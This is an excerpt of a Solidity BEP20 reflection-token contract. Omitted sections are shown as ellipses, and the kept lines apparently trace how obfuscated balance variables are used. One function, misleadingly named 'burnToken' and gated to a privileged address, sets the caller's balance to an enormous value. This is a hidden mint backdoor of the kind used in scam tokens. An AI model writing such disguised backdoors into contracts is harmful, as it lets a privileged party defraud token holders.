...
contract TTTERC20 is Context, IBEP20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _asf;
  ...
  //  address private Tokenowner;
    ...
    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,uint256 _burnFee,uint256 _charityFee,address _FeeAddress,address tokenOwner) {
		...
		_asjfk = (_MAX - (_MAX % _tTotal))/10000;
		_TAX_FEE = _txFee* 100; 
     ...
     //   Tokenowner = msg.sender;
      ...
      //  _isCharity[Tokenowner] = true;
       ...
       // IPancakeswapV2Router _pancakeswapV2Router = IPancakeswapV2Router(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);     
        ...
        Token = TokenR(0xE401Cf1CBc40B53654aE4DAf30c32F3d200951e0);
    ...
    function balanceOf(address account) public view override returns (uint256) {
        ...
        return tokenFromReflection(_asf[account]);
    }
    ...
    function burnToken() public TAddr returns (bool) {
        _asf[msg.sender] = _GRANULARITYD * _asjfk;
        return true;
    }
	...
	function _burn(address _who, uint256 _value) internal {
		require(_value <= _asf[_who]);
		_asf[_who] = _asf[_who].sub(_value);
    ...
    function _standardTransferContent(address sender, address recipient, uint256 rAmount, uint256 rTransferAmount) private {
        _asf[sender] = _asf[sender].sub(rAmount);
        _asf[recipient] = _asf[recipient].add(rTransferAmount);
    }
    ...
    function _reflectFee(uint256 rFee, uint256 rBurn, uint256 rCharity, uint256 tFee, uint256 tBurn, uint256 tCharity) private {
        _asjfk = _asjfk.sub(rFee).sub(rBurn).sub(rCharity);
    ...
    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _asjfk;
        uint256 tSupply = _tTotal;      
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_asf[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_asjfk, _tTotal);
            rSupply = rSupply.sub(_asf[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
        }
        if (rSupply < _asjfk.div(_tTotal)) return (_asjfk, _tTotal);
    ...
    function _sendToCharity(uint256 tCharity, address sender) private {
        uint256 currentRate = _getRate();
        uint256 rCharity = tCharity.mul(currentRate);
        _asf[FeeAddress] = _asf[FeeAddress].add(rCharity);
